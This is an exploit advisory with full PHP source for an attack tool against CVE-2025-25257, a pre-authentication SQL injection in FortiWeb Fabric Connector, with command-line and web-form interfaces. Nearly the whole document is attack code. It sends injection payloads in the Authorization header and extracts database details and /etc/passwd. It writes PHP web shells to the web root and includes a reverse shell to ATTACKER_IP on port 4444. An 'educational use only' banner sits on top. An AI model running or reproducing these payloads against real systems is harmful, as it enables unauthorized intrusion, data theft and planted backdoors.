@@ -1,0 +1,672 @@
+=============================================================================================================================================
+| # Title     : FortiWeb Fabric Connector 7.6.x Pre-authentication SQL Injection to RCE                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://docs.fortinet.com/document/fortiweb/7.6.0/administration-guide/721945/fabric-connectors                             |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/210193/ & 	CVE-2025-25257
+
+[+] Summary : 
+
+             Critical pre-authentication SQL injection vulnerability in Fortinet FortiWeb Fabric Connector (versions 7.0 through 7.6.x) 
+			 allowing unauthenticated attackers to achieve remote code execution through malicious SQL queries in the Authorization header.
+ 
+[+]  POC : 
+
+php poc.php  or http://127.0.0.1/poc.php 
+
+<?php
+/*
+ * indoushka
+ */
+
+class FortiWebExploit {
+    private $target;
+    private $port;
+    private $ssl;
+    private $base_path;
+    private $timeout;
+    
+    public function __construct($target, $port = 443, $ssl = true, $base_path = '/') {
+        $this->target = $target;
+        $this->port = $port;
+        $this->ssl = $ssl;
+        $this->base_path = rtrim($base_path, '/');
+        $this->timeout = 30;
+    }
+    
+    /**
+     * Check if target is vulnerable
+     */
+    public function check() {
+        echo "[*] Checking FortiWeb Fabric Connector vulnerability...\n";
+        
+        $payloads = [
+            "aaa' OR '1'='1",
+            "aaa' UNION SELECT 1,2,3--",
+            "aaa' AND 1=1--"
+        ];
+        
+        foreach ($payloads as $payload) {
+            echo "[*] Testing payload: " . htmlspecialchars($payload) . "\n";
+            
+            $response = $this->send_sqli_request($payload);
+            
+            if ($response && $this->is_vulnerable_response($response)) {
+                echo "[+] ✓ SQL Injection successful with payload: " . htmlspecialchars($payload) . "\n";
+                echo "[+] Target is vulnerable to CVE-2025-25257\n";
+                return "vulnerable";
+            }
+        }
+        
+        echo "[-] Target does not appear to be vulnerable\n";
+        return "safe";
+    }
+    
+    /**
+     * Send SQL injection request
+     */
+    private function send_sqli_request($sql_payload) {
+        $url = $this->build_url('/api/fabric/device/status');
+        
+        $headers = [
+            "Authorization: Bearer {$sql_payload}",
+            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept: application/json"
+        ];
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $this->timeout,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_HTTPHEADER => $headers,
+            CURLOPT_HEADER => true
+        ]);
+        
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        if ($response) {
+            $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+            $headers = substr($response, 0, $header_size);
+            $body = substr($response, $header_size);
+            
+            return [
+                'code' => $http_code,
+                'headers' => $headers,
+                'body' => $body
+            ];
+        }
+        
+        return false;
+    }
+    
+    /**
+     * Check if response indicates vulnerability
+     */
+    private function is_vulnerable_response($response) {
+        // Successful SQL injection might return different status codes or data
+        if ($response['code'] == 200) {
+            // Check for database-related content or different response patterns
+            if (strpos($response['body'], 'device') !== false || 
+                strpos($response['body'], 'status') !== false ||
+                strpos($response['body'], 'error') === false) {
+                return true;
+            }
+        }
+        
+        // Sometimes SQL injection causes different error responses
+        if ($response['code'] == 500) {
+            // Database errors might indicate SQL injection
+            if (strpos($response['body'], 'SQL') !== false ||
+                strpos($response['body'], 'database') !== false ||
+                strpos($response['body'], 'syntax') !== false) {
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    /**
+     * Exploit the SQL injection for information disclosure
+     */
+    public function exploit_sqli($technique = 'info') {
+        echo "[*] Exploiting SQL injection for information disclosure...\n";
+        
+        $queries = [];
+        
+        switch ($technique) {
+            case 'info':
+                $queries = [
+                    "Database Version" => "aaa' UNION SELECT version(),2,3--",
+                    "Current User" => "aaa' UNION SELECT user(),2,3--",
+                    "Database Name" => "aaa' UNION SELECT database(),2,3--",
+                    "Server Hostname" => "aaa' UNION SELECT @@hostname,2,3--"
+                ];
+                break;
+                
+            case 'tables':
+                $queries = [
+                    "List Tables" => "aaa' UNION SELECT table_name,2,3 FROM information_schema.tables--",
+                    "Users Table" => "aaa' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_name LIKE '%user%'--"
+                ];
+                break;
+                
+            case 'advanced':
+                $queries = [
+                    "File Read" => "aaa' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--",
+                    "System Command" => "aaa' UNION SELECT '<?php system(\$_GET[\"cmd\"]); ?>',2,3--"
+                ];
+                break;
+        }
+        
+        $results = [];
+        
+        foreach ($queries as $description => $query) {
+            echo "[*] Executing: $description\n";
+            $response = $this->send_sqli_request($query);
+            
+            if ($response && $response['code'] == 200) {
+                $results[$description] = $this->extract_data($response['body']);
+                echo "[+] Success: " . substr($results[$description], 0, 100) . "...\n";
+            } else {
+                $results[$description] = "Failed (HTTP {$response['code']})";
+                echo "[-] Failed\n";
+            }
+            
+            sleep(1); // Rate limiting
+        }
+        
+        return $results;
+    }
+    
+    /**
+     * Extract data from response
+     */
+    private function extract_data($body) {
+        // Try to parse JSON response
+        $json = json_decode($body, true);
+        if ($json !== null) {
+            return json_encode($json, JSON_PRETTY_PRINT);
+        }
+        
+        // Return first 500 characters if not JSON
+        return substr($body, 0, 500);
+    }
+    
+    /**
+     * Attempt to achieve RCE through various methods
+     */
+    public function attempt_rce($method = 'file_write') {
+        echo "[*] Attempting Remote Code Execution...\n";
+        
+        switch ($method) {
+            case 'file_write':
+                return $this->attempt_file_write();
+                
+            case 'command_injection':
+                return $this->attempt_command_injection();
+                
+            case 'web_shell':
+                return $this->attempt_web_shell_upload();
+                
+            default:
+                echo "[-] Unknown RCE method\n";
+                return false;
+        }
+    }
+    
+    /**
+     * Attempt to write files via SQL injection
+     */
+    private function attempt_file_write() {
+        echo "[*] Attempting file write via SQL injection...\n";
+        
+        // Try to write a simple test file
+        $test_content = "<?php echo 'Vulnerable: ' . date('Y-m-d H:i:s'); ?>";
+        $queries = [
+            "Write PHP Test" => "aaa' UNION SELECT '{$test_content}',2,3 INTO OUTFILE '/tmp/test_rce.php'--",
+            "Write Web Shell" => "aaa' UNION SELECT '<?php if(isset(\$_GET[\"cmd\"])) system(\$_GET[\"cmd\"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--"
+        ];
+        
+        foreach ($queries as $desc => $query) {
+            echo "[*] Trying: $desc\n";
+            $response = $this->send_sqli_request($query);
+            
+            if ($response) {
+                echo "[*] Response: HTTP {$response['code']}\n";
+                
+                // Check if file was written
+                if ($this->check_file_access($desc)) {
+                    echo "[+] File may have been written successfully\n";
+                    return true;
+                }
+            }
+        }
+        
+        return false;
+    }
+    
+    /**
+     * Check if written files are accessible
+     */
+    private function check_file_access($file_type) {
+        $test_urls = [
+            '/tmp/test_rce.php',
+            '/var/www/html/shell.php',
+            '/shell.php'
+        ];
+        
+        foreach ($test_urls as $test_path) {
+            $url = $this->build_url($test_path);
+            echo "[*] Checking access to: $url\n";
+            
+            $ch = curl_init();
+            curl_setopt_array($ch, [
+                CURLOPT_URL => $url,
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT => 10,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_SSL_VERIFYHOST => false
+            ]);
+            
+            $response = curl_exec($ch);
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            
+            if ($http_code == 200) {
+                echo "[+] ✓ File accessible: $url\n";
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    /**
+     * Attempt command injection
+     */
+    private function attempt_command_injection() {
+        echo "[*] Attempting command injection...\n";
+        
+        // Try to execute system commands via various methods
+        $commands = [
+            "id; whoami; pwd",
+            "uname -a",
+            "cat /etc/passwd"
+        ];
+        
+        foreach ($commands as $cmd) {
+            $encoded_cmd = base64_encode($cmd);
+            $query = "aaa' UNION SELECT '<?php system(base64_decode(\"{$encoded_cmd}\")); ?>',2,3--";
+            
+            echo "[*] Executing: $cmd\n";
+            $response = $this->send_sqli_request($query);
+            
+            if ($response && $this->contains_command_output($response['body'], $cmd)) {
+                echo "[+] Command may have executed successfully\n";
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    /**
+     * Check if response contains command output indicators
+     */
+    private function contains_command_output($body, $command) {
+        $indicators = ['root', 'www-data', '/home', '/var/www', 'Linux'];
+        
+        foreach ($indicators as $indicator) {
+            if (strpos($body, $indicator) !== false) {
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    /**
+     * Attempt web shell upload
+     */
+    private function attempt_web_shell_upload() {
+        echo "[*] Attempting web shell upload...\n";
+        
+        $web_shells = [
+            'Basic Shell' => '<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>',
+            'Advanced Shell' => '<?php if(isset($_POST["c"])){ echo "<pre>"; system($_POST["c"]); echo "</pre>"; } ?>',
+            'Reverse Shell' => '<?php $sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");?>'
+        ];
+        
+        foreach ($web_shells as $name => $shell_code) {
+            echo "[*] Uploading: $name\n";
+            
+            $query = "aaa' UNION SELECT '{$shell_code}',2,3 INTO OUTFILE '/var/www/html/" . $this->random_text(8) . ".php'--";
+            $response = $this->send_sqli_request($query);
+            
+            if ($response) {
+                echo "[*] Upload attempt completed - HTTP {$response['code']}\n";
+            }
+        }
+        
+        echo "[*] Web shell upload attempts completed\n";
+        echo "[*] Check common web paths for uploaded shells\n";
+        
+        return true;
+    }
+    
+    /**
+     * Build full URL
+     */
+    private function build_url($path) {
+        $protocol = $this->ssl ? 'https' : 'http';
+        $full_path = $this->base_path . $path;
+        return "{$protocol}://{$this->target}:{$this->port}{$full_path}";
+    }
+    
+    /**
+     * Generate random text
+     */
+    private function random_text($length = 8) {
+        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        $result = '';
+        for ($i = 0; $i < $length; $i++) {
+            $result .= $chars[rand(0, strlen($chars) - 1)];
+        }
+        return $result;
+    }
+}
+
+// CLI Interface
+if (php_sapi_name() === 'cli') {
+    echo "
+    ╔══════════════════════════════════════════════════════════════╗
+    ║              FortiWeb Fabric Connector Exploit              ║
+    ║                      CVE-2025-25257                         ║
+    ║                     PHP Implementation                      ║
+    ╚══════════════════════════════════════════════════════════════╝
+    
+    \n";
+    
+    $options = getopt("t:p:s:u:cae:m:", [
+        "target:",
+        "port:",
+        "ssl",
+        "uri:",
+        "check",
+        "sqli",
+        "rce",
+        "method:"
+    ]);
+    
+    $target = $options['t'] ?? $options['target'] ?? null;
+    $port = $options['p'] ?? $options['port'] ?? 443;
+    $ssl = isset($options['s']) || isset($options['ssl']);
+    $base_uri = $options['u'] ?? $options['uri'] ?? '/';
+    $check_only = isset($options['c']) || isset($options['check']);
+    $sqli_only = isset($options['a']) || isset($options['sqli']);
+    $rce_only = isset($options['e']) || isset($options['rce']);
+    $method = $options['m'] ?? $options['method'] ?? 'file_write';
+    
+    if (!$target) {
+        echo "Usage: php fortiweb_exploit.php [options]\n";
+        echo "Options:\n";
+        echo "  -t, --target    Target host (required)\n";
+        echo "  -p, --port      Target port (default: 443)\n";
+        echo "  -s, --ssl       Use SSL (default: true)\n";
+        echo "  -u, --uri       Base URI path (default: /)\n";
+        echo "  -c, --check     Check only for vulnerability\n";
+        echo "  -a, --sqli      Perform SQL injection information disclosure\n";
+        echo "  -e, --rce       Attempt Remote Code Execution\n";
+        echo "  -m, --method    RCE method: file_write, command_injection, web_shell (default: file_write)\n";
+        echo "\nExamples:\n";
+        echo "  php fortiweb_exploit.php -t 192.168.1.100 -c\n";
+        echo "  php fortiweb_exploit.php -t fortiweb.company.com -a\n";
+        echo "  php fortiweb_exploit.php -t 10.0.0.5 -e -m web_shell\n";
+        exit(1);
+    }
+    
+    $exploit = new FortiWebExploit($target, $port, $ssl, $base_uri);
+    
+    if ($check_only) {
+        $result = $exploit->check();
+        echo "\n[*] Result: {$result}\n";
+    } elseif ($sqli_only) {
+        $results = $exploit->exploit_sqli('info');
+        echo "\n[*] SQL Injection Results:\n";
+        foreach ($results as $desc => $result) {
+            echo "{$desc}:\n{$result}\n" . str_repeat("-", 50) . "\n";
+        }
+    } elseif ($rce_only) {
+        if ($exploit->attempt_rce($method)) {
+            echo "[+] RCE attempt completed - check for success indicators\n";
+        } else {
+            echo "[-] RCE attempt failed\n";
+        }
+    } else {
+        // Full exploitation chain
+        $result = $exploit->check();
+        if ($result === "vulnerable") {
+            echo "\n[*] Proceeding with exploitation...\n";
+            $exploit->exploit_sqli('info');
+            $exploit->attempt_rce($method);
+        }
+    }
+    
+} else {
+    // Web Interface
+    $action = $_POST['action'] ?? '';
+    
+    if ($action === 'check' || $action === 'sqli' || $action === 'rce') {
+        $target = $_POST['target'] ?? '';
+        $port = $_POST['port'] ?? 443;
+        $ssl = isset($_POST['ssl']);
+        $base_uri = $_POST['uri'] ?? '/';
+        $sqli_technique = $_POST['sqli_technique'] ?? 'info';
+        $rce_method = $_POST['rce_method'] ?? 'file_write';
+        
+        if (empty($target)) {
+            echo "<div style='color: red; padding: 10px; border: 1px solid red; margin: 10px;'>Target host is required</div>";
+        } else {
+            $exploit = new FortiWebExploit($target, $port, $ssl, $base_uri);
+            
+            ob_start();
+            
+            if ($action === 'check') {
+                $exploit->check();
+            } elseif ($action === 'sqli') {
+                $results = $exploit->exploit_sqli($sqli_technique);
+                echo "\n[*] SQL Injection Results:\n";
+                foreach ($results as $desc => $result) {
+                    echo "{$desc}:\n{$result}\n" . str_repeat("-", 50) . "\n";
+                }
+            } elseif ($action === 'rce') {
+                $exploit->attempt_rce($rce_method);
+            }
+            
+            $output = ob_get_clean();
+            
+            echo "<pre style='background: #f4f4f4; padding: 15px; border: 1px solid #ddd; border-radius: 4px;'>$output</pre>";
+        }
+        
+        echo '<a href="' . htmlspecialchars($_SERVER['PHP_SELF']) . '" style="display: inline-block; padding: 10px 20px; background: #007cba; color: white; text-decoration: none; border-radius: 4px; margin: 10px 0;">Back to Form</a>';
+        
+    } else {
+        // Display the form
+        echo '<!DOCTYPE html>
+        <html>
+        <head>
+            <title>FortiWeb Fabric Connector Exploit - CVE-2025-25257</title>
+            <meta charset="UTF-8">
+            <style>
+                body { 
+                    font-family: Arial, sans-serif; 
+                    margin: 0; 
+                    padding: 20px; 
+                    background: #f5f5f5;
+                }
+                .container { 
+                    max-width: 800px; 
+                    margin: 0 auto; 
+                    background: white;
+                    padding: 30px;
+                    border-radius: 8px;
+                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                }
+                h1 { 
+                    color: #333; 
+                    border-bottom: 2px solid #007cba;
+                    padding-bottom: 10px;
+                }
+                h3 {
+                    color: #666;
+                }
+                .form-group { 
+                    margin-bottom: 20px; 
+                }
+                label { 
+                    display: block; 
+                    margin-bottom: 8px; 
+                    font-weight: bold;
+                    color: #333;
+                }
+                input[type="text"], select { 
+                    width: 100%; 
+                    padding: 10px; 
+                    border: 1px solid #ddd; 
+                    border-radius: 4px; 
+                    box-sizing: border-box;
+                    font-size: 14px;
+                }
+                .checkbox-group {
+                    display: flex;
+                    align-items: center;
+                    gap: 10px;
+                }
+                button { 
+                    background: #007cba; 
+                    color: white; 
+                    padding: 12px 25px; 
+                    border: none; 
+                    border-radius: 4px; 
+                    cursor: pointer; 
+                    margin-right: 10px;
+                    font-size: 16px;
+                    transition: background 0.3s;
+                }
+                button:hover {
+                    background: #005a87;
+                }
+                .danger { 
+                    background: #dc3545; 
+                }
+                .danger:hover {
+                    background: #c82333;
+                }
+                .info { 
+                    background: #17a2b8; 
+                }
+                .info:hover {
+                    background: #138496;
+                }
+                .warning-box {
+                    background: #fff3cd;
+                    border: 1px solid #ffeaa7;
+                    color: #856404;
+                    padding: 15px;
+                    border-radius: 4px;
+                    margin: 20px 0;
+                }
+                .info-box {
+                    background: #d1ecf1;
+                    border: 1px solid #bee5eb;
+                    color: #0c5460;
+                    padding: 15px;
+                    border-radius: 4px;
+                    margin: 20px 0;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>FortiWeb Fabric Connector Exploit</h1>
+                <h3>CVE-2025-25257 - Pre-authentication SQL Injection to RCE</h3>
+                
+                <div class="warning-box">
+                    <strong>⚠️ Educational Use Only:</strong> This tool demonstrates a critical vulnerability in FortiWeb Fabric Connector.
+                    Use only on systems you own or have explicit permission to test.
+                </div>
+                
+                <form method="post">
+                    <div class="form-group">
+                        <label for="target">Target Host:</label>
+                        <input type="text" id="target" name="target" placeholder="192.168.1.100 or fortiweb.company.com" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="port">Port:</label>
+                        <input type="text" id="port" name="port" value="443">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="uri">Base URI:</label>
+                        <input type="text" id="uri" name="uri" value="/">
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="ssl" name="ssl" checked>
+                            <label for="ssl" style="display: inline; font-weight: normal;">Use SSL</label>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="sqli_technique">SQL Injection Technique:</label>
+                        <select id="sqli_technique" name="sqli_technique">
+                            <option value="info">Information Disclosure</option>
+                            <option value="tables">Database Tables</option>
+                            <option value="advanced">Advanced Queries</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="rce_method">RCE Method:</label>
+                        <select id="rce_method" name="rce_method">
+                            <option value="file_write">File Write</option>
+                            <option value="command_injection">Command Injection</option>
+                            <option value="web_shell">Web Shell Upload</option>
+                        </select>
+                    </div>
+                    
+                    <button type="submit" name="action" value="check" class="info">Check Vulnerability</button>
+                    <button type="submit" name="action" value="sqli" class="info">SQL Injection</button>
+                    <button type="submit" name="action" value="rce" class="danger">Attempt RCE</button>
+                </form>
+                
+                <div class="info-box">
+                    <h3>About CVE-2025-25257:</h3>
+                    <p><strong>Vulnerability:</strong> Pre-authentication SQL Injection</p>
+                    <p><strong>Affected Versions:</strong> FortiWeb Fabric Connector 7.0 through 7.6.x</p>
+                    <p><strong>Endpoint:</strong> /api/fabric/device/status</p>
+                    <p><strong>Parameter:</strong> Authorization header (Bearer token)</p>
+                    <p><strong>Impact:</strong> Remote Code Execution via SQL injection</p>
+                    <p><strong>Exploit Chain:</strong> SQL Injection → Data Extraction → File Write → RCE</p>
+                </div>
+            </div>
+        </body>
+        </html>';
+    }
+}
+?>
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
